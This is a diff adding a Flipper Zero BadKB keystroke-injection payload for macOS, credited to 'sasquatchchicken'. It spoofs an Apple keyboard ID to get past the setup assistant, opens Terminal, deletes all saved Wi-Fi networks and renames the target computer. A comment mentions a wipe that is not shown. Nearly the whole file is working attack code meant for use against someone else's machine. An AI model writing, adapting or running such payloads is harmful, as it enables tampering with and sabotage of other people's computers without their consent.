@@ -1,0 +1,20 @@
+ID 05ac:021e Apple:Keyboard
+REM Keep these 3 lines IF (and only if) it's the first time you are performing a badKB attack against a specific macOS target.
+REM In fact, it helps Flipper Zero bypass the macOS keyboard setup assistant. Otherwise the attack will not start.
+REM Author: sasquatchchicken
+REM Version 1.0 (Flipper Ducky)
+REM Target: macOS
+DELAY 500
+F4
+DELAY 1000
+REM Open Terminal
+STRING Terminal
+ENTER
+DELAY 1000
+REM remove all the saved wireless networks from the targeted machine
+STRING networksetup -removeallpreferredwirelessnetworks Wi-Fi
+ENTER
+DELAY 500
+REM set the target computer name before you wipe
+STRING networksetup -setcomputername no_mames_wey
+ENTER
